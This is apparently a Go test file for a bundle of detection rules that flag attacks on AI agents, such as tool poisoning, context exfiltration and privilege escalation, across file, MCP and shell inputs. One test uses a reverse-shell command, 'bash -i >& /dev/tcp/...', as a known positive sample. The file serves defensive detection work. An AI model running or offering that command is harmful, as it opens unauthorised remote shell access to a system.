package atr

import (
	"strings"
	"testing"
)

// TestBundledRulesLoad asserts that the embedded snapshot loads cleanly:
// every rule in the bundle parses, has a valid category, and emits at
// least one compilable regex. Per-rule parse failures and dropped
// patterns are tolerated at runtime (see bundle.go); this test catches
// the gross regressions — a YAML file that doesn't decode at all, a
// category typo that drops every rule in the file, etc.
func TestBundledRulesLoad(t *testing.T) {
	rules, err := LoadBundled()
	if err != nil {
		t.Fatalf("LoadBundled returned error: %v", err)
	}
	if len(rules) == 0 {
		t.Fatal("LoadBundled returned 0 rules; expected the vendored snapshot to be present")
	}
	// Spike target: ~107 rules in the read-file/MCP pool. Allow a
	// wide envelope so a single upstream rule add/remove doesn't
	// fail this test, but flag the case where a sync went badly
	// wrong and we lost half the bundle.
	if len(rules) < 50 {
		t.Fatalf("read-file/MCP pool has only %d rules; expected ~107 (sync regression?)", len(rules))
	}
	for _, r := range rules {
		if r.ID == "" {
			t.Errorf("rule with empty ID slipped into bundle: %+v", r)
		}
		if !IsAllowedCategory(r.Category) {
			t.Errorf("rule %s has out-of-scope category %q", r.ID, r.Category)
		}
		if len(r.Patterns) == 0 {
			t.Errorf("rule %s has zero compilable patterns; should have been dropped at load time", r.ID)
		}
	}
}

// TestBundleCategoryDistribution makes the "what's in the bundle" view
// observable from the test output. Counts per category are printed via
// t.Log so a sync regression that drops half a category is visible at a
// glance.
//
// Asserts the post-2026-05-27-split semantics: read-file pool excludes
// tool-poisoning (those rules fire on Python dunders and other code
// idioms because their patterns are authored for MCP tool_args, not
// file content), while the MCP pool retains the full set including
// tool-poisoning.
func TestBundleCategoryDistribution(t *testing.T) {
	rf, err := LoadBundled()
	if err != nil {
		t.Fatalf("LoadBundled: %v", err)
	}
	rfCounts := CountByCategory(rf)
	t.Logf("read-file pool: total=%d", len(rf))
	for cat, n := range rfCounts {
		t.Logf("  %s: %d", cat, n)
	}
	// Read-file pool requires non-zero presence in skill-compromise
	// and context-exfiltration. Tool-poisoning MUST be absent — the
	// regression guard for production FP captured 2026-05-27.
	for _, want := range []Category{
		CategorySkillCompromise,
		CategoryContextExfiltration,
	} {
		if rfCounts[want] == 0 {
			t.Errorf("read-file category %s has zero rules", want)
		}
	}
	if rfCounts[CategoryToolPoisoning] != 0 {
		t.Errorf("read-file pool must not contain tool-poisoning rules "+
			"(production FP class ATR-2026-00062 / __[a-z]+__): "+
			"got %d", rfCounts[CategoryToolPoisoning])
	}

	mcp, err := LoadBundledForTarget(TargetMCP)
	if err != nil {
		t.Fatalf("LoadBundledForTarget(mcp): %v", err)
	}
	mcpCounts := CountByCategory(mcp)
	t.Logf("MCP pool: total=%d", len(mcp))
	for cat, n := range mcpCounts {
		t.Logf("  %s: %d", cat, n)
	}
	// MCP pool retains the full set; tool-poisoning rules are
	// authored for tool_args / tool_response and DO fit this surface.
	for _, want := range []Category{
		CategorySkillCompromise,
		CategoryToolPoisoning,
		CategoryContextExfiltration,
	} {
		if mcpCounts[want] == 0 {
			t.Errorf("MCP category %s has zero rules", want)
		}
	}
	// The MCP pool must be strictly larger than the read-file pool
	// since the only difference is tool-poisoning. If they're equal,
	// the pool split didn't actually fire and we're back to running
	// tool-poisoning rules on file content.
	if len(mcp) <= len(rf) {
		t.Errorf("MCP pool (%d) must be larger than read-file pool (%d); "+
			"the tool-poisoning subtraction did not fire", len(mcp), len(rf))
	}
}

// TestShellSubsetLoad confirms the hand-curated shell subset is
// present and loads cleanly. The exact count is asserted only as a
// minimum threshold — the curation may add/drop rules between sync
// passes, but should never fall below 10 (the floor that justifies
// having shell coverage at all).
func TestShellSubsetLoad(t *testing.T) {
	rules, err := LoadBundledForTarget(TargetShell)
	if err != nil {
		t.Fatalf("LoadBundledForTarget(shell): %v", err)
	}
	t.Logf("shell pool: total=%d", len(rules))
	if len(rules) < 10 {
		t.Errorf("shell pool has only %d rules; expected at least 10 hand-curated entries", len(rules))
	}
	for _, r := range rules {
		// Shell rules MUST be in the recon/resource-dev allowed set,
		// AND must come from a category we deliberately approved for
		// shell shape detection. Read-file/MCP can carry rules from
		// any of the 3 broad categories; shell is stricter.
		switch r.Category {
		case CategoryPrivilegeEscalation,
			CategoryExcessiveAutonomy,
			CategoryContextExfiltration:
			// ok
		default:
			t.Errorf("shell rule %s has out-of-shell-scope category %q", r.ID, r.Category)
		}
	}
}

// TestEvaluateMatchesKnownPositive uses one of ATR's own published
// true-positive test cases — the tool-poisoning rule ATR-2026-00010
// matches `bash -i >& /dev/tcp/...` as a reverse shell — to assert
// that the evaluator correctly hits a known pattern from the
// bundled corpus. This catches the failure mode where the bundle
// loaded but the regex compilation produced patterns that don't
// match the inputs ATR's own rule authors verified.
func TestEvaluateMatchesKnownPositive(t *testing.T) {
	rules, err := LoadBundled()
	if err != nil {
		t.Fatalf("LoadBundled: %v", err)
	}
	matches := Evaluate("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", rules)
	if len(matches) == 0 {
		t.Fatal("Evaluate found no matches on canonical reverse-shell payload; " +
			"bundled rules may have failed to compile their tool-poisoning regex")
	}
	hit := false
	for _, m := range matches {
		if strings.HasPrefix(m.RuleID, "ATR-") && m.Severity == SeverityCritical {
			hit = true
		}
	}
	if !hit {
		t.Errorf("matches present but none at SeverityCritical with ATR-* ID: %+v", matches)
	}
}

// TestEvaluateMatchesKnownNegative confirms the evaluator does not
// fire on obviously benign content. This is the cheap end of the FP
// check; the real FP measurement happens in the bench against a
// larger corpus.
func TestEvaluateMatchesKnownNegative(t *testing.T) {
	rules, err := LoadBundled()
	if err != nil {
		t.Fatalf("LoadBundled: %v", err)
	}
	negatives := []string{
		"hello world",
		"git status",
		"npm install",
		"this is a documentation paragraph about the chmod command",
	}
	for _, neg := range negatives {
		if m := Evaluate(neg, rules); len(m) > 0 {
			t.Errorf("Evaluate fired on benign input %q: %+v", neg, m)
		}
	}
}
